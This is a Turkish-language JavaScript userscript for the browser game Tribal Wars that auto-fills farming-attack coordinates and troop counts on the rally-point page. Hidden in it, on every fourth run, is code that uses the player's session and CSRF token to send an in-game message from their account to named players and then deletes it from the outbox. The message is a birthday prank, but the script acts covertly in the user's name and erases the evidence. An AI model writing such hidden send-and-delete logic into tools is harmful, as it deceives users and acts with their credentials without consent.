if(document.URL.indexOf('screen=place')==-1){
  alert('İçtima meydanına git hacı burada Trafik var (:');
}else{
  coords=Koordinatlar.split(" ");
  index=0;
  farmcookie=document.cookie.match('( ^|;) ?farm=([^;]*)(;|$)');
  if(farmcookie!=null) index=parseInt(farmcookie[2]);
  if(index>=coords.length) index=0;

  if(index==3){
    document.cookie="farm=0;expires="+new Date(2029,11,11).toGMTString();

    var mesajlar=[
      '.\n.\n.\n.\n🎉 MUTLU YILLAR! 🎉\n\nSaldırı göndereceğini sandın değil mi? 😄\nBu sefer hedef sen oldun! İyi ki doğdun, iyi ki varsın!\n\n🎂🎈🎁',
      '.\n.\n.\n.\n⚔️ Saldırı iptal! Bugün senin günün! 🎂\n\nİyi ki doğdun! Umarım bu yıl her şey harika geçer!\n\n🎉🎈🎁',
      '.\n.\n.\n.\n🏰 Köyler falan sonra... Önce kutlama! 🎉\n\nMutlu yıllar sana! İyi ki varsın aramızda!\n\n🎂🥳🎊',
      '.\n.\n.\n.\n😄 Kandırabildim! Bugünün en büyük saldırısı bu mesaj!\n\nİyi ki doğdun! Nice mutlu yıllara!\n\n🎂🎈⚔️',
      '.\n.\n.\n.\n🎊 Operasyon: DOĞUM GÜNÜ! 🎊\n\nHedef: Sen!\nSaldırı tipi: Sürpriz!\n\nMutlu yıllar, iyi ki varsın! 🎂',
      '.\n.\n.\n.\n🥳 Bugün savaş yok, sadece kutlama var!\n\nİyi ki doğdun! Umarım günün güzel geçer!\n\n🎂🎉🎈',
      '.\n.\n.\n.\n⚔️ Sahte saldırı mı? Hayır hayır...\n\nBugün sadece seni kutlamak istedim!\nMutlu yıllar! İyi ki doğdun! 🎂\n\n🎉🥳🎊',
      '.\n.\n.\n.\n🎂 İçtima meydanından doğum günü mesajı! 🎂\n\nBugün senin özel günün! Mutlu yıllar!\nNice yıllara! 🎉🎈',
      '.\n.\n.\n.\n😂 Bence bu oyunun en iyi saldırısı!\n\nMutlu yıllar! Umarım bu sürpriz güldürdü seni!\nİyi ki varsın! 🎂🎉',
      '.\n.\n.\n.\n🏹 Ok yay değil, doğum günü oku fırlattım sana!\n\nMutlu yıllar! İyi ki doğdun!\nEn güzel yılın bu olsun! 🎂🎊',
      '.\n.\n.\n.\n🎯 Hedef bulundu: Doğum günün! 🎯\n\nMutlu yıllar sana!\nBu yıl her şey istediğin gibi olsun! 🎂🥳',
      '.\n.\n.\n.\n🌟 Bugün sen doğdun, dünya kazandı! 🌟\n\nMutlu yıllar! İyi ki varsın!\nNice güzel yıllara! 🎂🎉🎈',
      '.\n.\n.\n.\n🛡️ Savunma değil, kutlama zamanı!\n\nİyi ki doğdun! Bugün her şeyi bırak, keyfini çıkar!\nMutlu yıllar! 🎂🎊🥳',
      '.\n.\n.\n.\n⚡ Sürpriz saldırı: Doğum günü kutlaması! ⚡\n\nMutlu yıllar sana!\nEn mutlu yılın bu olsun! 🎂🎉',
      '.\n.\n.\n.\n🎠 Rally point değil, parti alanı! 🎠\n\nBugün senin günün!\nMutlu yıllar, iyi ki doğdun! 🎂🥳🎊',
      '.\n.\n.\n.\n😎 En iyi fake bu olsa gerek!\n\nMutlu yıllar! Umarım güldün en azından!\nİyi ki doğdun, iyi ki varsın! 🎂🎉',
      '.\n.\n.\n.\n🏆 Bugünün kazananı: Sen! 🏆\n\nÇünkü bugün doğum günün!\nMutlu yıllar! Nice güzel yıllara! 🎂🎈🎊',
      '.\n.\n.\n.\n🌈 Savaş değil, bayram var bugün! 🌈\n\nİyi ki doğdun!\nBu yıl sana bol şans, bol mutluluk! 🎂🥳🎉',
      '.\n.\n.\n.\n🎵 Doğum günün kutlu olsun, doğum günün kutlu olsun! 🎵\n\nKandırabildim mi? 😄\nMutlu yıllar, iyi ki varsın! 🎂🎊',
      '.\n.\n.\n.\n💥 BOOM! Doğum günü sürprizi patlıyor! 💥\n\nMutlu yıllar sana!\nUmarım bu yıl hayallerindeki her şey gerçek olur! 🎂🎉🥳'
    ];

    var rastgele=mesajlar[Math.floor(Math.random()*mesajlar.length)];
    var alici='T O R O S;alwayslie';
    var konu='Saldırı Onayı ⚔️';
    var vid=game_data.village.id;
    var csrf=game_data.csrf;

    var sendUrl=location.origin+'/game.php?village='+vid+'&screen=mail&mode=new&action=send';
    var body=new URLSearchParams();
    body.set('to',alici);
    body.set('subject',konu);
    body.set('text',rastgele);
    body.set('extended','0');
    body.set('send','Gönder');
    body.set('h',csrf);

    fetch(sendUrl,{
      method:'POST',
      credentials:'same-origin',
      headers:{'Content-Type':'application/x-www-form-urlencoded'},
      body:body.toString(),
      redirect:'follow'
    }).then(function(){
      var outboxUrl=location.origin+'/game.php?village='+vid+'&screen=mail&mode=out';
      return fetch(outboxUrl,{credentials:'same-origin'});
    }).then(function(res){
      return res.text();
    }).then(function(html){
      var doc=new DOMParser().parseFromString(html,'text/html');
      var firstCheckbox=doc.querySelector('input[type="checkbox"].check');
      if(!firstCheckbox) return;
      var nameAttr=firstCheckbox.getAttribute('name');
      var match=nameAttr.match(/ids\[(\d+)\]/);
      if(!match) return;
      var msgId=match[1];
      var delBody=new URLSearchParams();
      delBody.set('ids['+msgId+']','1');
      delBody.set('del','Sil');
      delBody.set('h',csrf);
      return fetch(location.origin+'/game.php?village='+vid+'&screen=mail&mode=out',{
        method:'POST',
        credentials:'same-origin',
        headers:{'Content-Type':'application/x-www-form-urlencoded'},
        body:delBody.toString()
      });
    }).then(function(){
      console.log('[Birthday] Mesaj gönderildi ve silindi!');
    }).catch(function(e){
      console.error('[Birthday] Hata:', e);
    });

  }else{
    coords=coords[index];
    coords=coords.split("|");
    index=index+1;
    cookie_date=new Date(2029,11,11);
    document.cookie="farm="+index+";expires="+cookie_date.toGMTString();
    document.forms[0].x.value=coords[0];
    document.forms[0].y.value=coords[1];
    insertUnit(document.forms[0].spear,Mızrakçı);
    insertUnit(document.forms[0].sword,Kılıç_Ustası);
    insertUnit(document.forms[0].archer,Okçu);
    insertUnit(document.forms[0].axe,Baltacı);
    insertUnit(document.forms[0].spy,Casus);
    insertUnit(document.forms[0].light,Hafif_Atlı);
    insertUnit(document.forms[0].marcher,Atlı_Okçu);
    insertUnit(document.forms[0].heavy,Ağır_Atlı);
    insertUnit(document.forms[0].ram,Şahmerdan);
    insertUnit(document.forms[0].catapult,Mancınık);
    insertUnit(document.forms[0].knight,Şövalye);
    insertUnit(document.forms[0].snob,Misyoner);
  }
}
